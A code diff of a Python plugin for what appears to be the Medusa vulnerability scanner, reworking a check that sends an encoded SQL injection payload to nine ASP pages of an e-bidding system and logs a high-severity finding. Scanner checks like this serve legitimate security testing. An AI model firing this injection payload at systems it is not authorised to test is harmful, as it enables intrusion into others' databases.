@@ -41,22 +41,21 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    global resp
-    global resp2
-    try:
-        urls = [
-            "/Rat/ebid/viewInvite3.asp?InviteId=0000002852",
-            "/Rat/ebid/viewInvite4.asp?InviteId=0000002852",
-            "/Rat/ebid/viewInvite5.asp?InviteId=0000002852",
-            "/Rat/ebid/viewInvite6.asp?InviteId=0000002852",
-            "/Rat/ebid/viewInvite2.asp?InviteId=0000002852",
-            "/Rat/ebid/viewInvite1.asp?InviteId=0000002852",
-            "/Rat/EBid/ViewClarify1.asp?InviteId=11",
-            "/Rat/EBid/ViewClarify.asp?InviteId=11",
-            "/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11",
-        ]
-        data = "%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
-        for payload in urls:
+
+    urls = [
+        "/Rat/ebid/viewInvite3.asp?InviteId=0000002852",
+        "/Rat/ebid/viewInvite4.asp?InviteId=0000002852",
+        "/Rat/ebid/viewInvite5.asp?InviteId=0000002852",
+        "/Rat/ebid/viewInvite6.asp?InviteId=0000002852",
+        "/Rat/ebid/viewInvite2.asp?InviteId=0000002852",
+        "/Rat/ebid/viewInvite1.asp?InviteId=0000002852",
+        "/Rat/EBid/ViewClarify1.asp?InviteId=11",
+        "/Rat/EBid/ViewClarify.asp?InviteId=11",
+        "/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11",
+    ]
+    data = "%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
+    for payload in urls:
+        try:
             payload_url = scheme + "://" + url +":"+ str(port)+payload+data
 
 
@@ -67,13 +66,6 @@ def medusa(Url,RandomAgent,ProxyIp):
             }
 
             s = requests.session()
-            # if ProxyIp!=None:
-            #     proxies = {
-            #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-            #         "http": "http://" + str(ProxyIp)
-            #     }
-            #     resp = s.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
-            # elif ProxyIp==None:
             resp = s.get(payload_url,headers=headers, timeout=6, verify=False)
             con = resp.text
             code = resp.status_code
@@ -82,7 +74,7 @@ def medusa(Url,RandomAgent,ProxyIp):
                 _t=VulnerabilityInfo(Medusa)
                 web=ClassCongregation.VulnerabilityDetails(_t.info)
                 web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-                return (str(Medusa))
-    except Exception:
-        _ = VulnerabilityInfo('').info.get('algroup')
-        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
+                ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
+        except Exception:
+            _ = VulnerabilityInfo('').info.get('algroup')
+            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
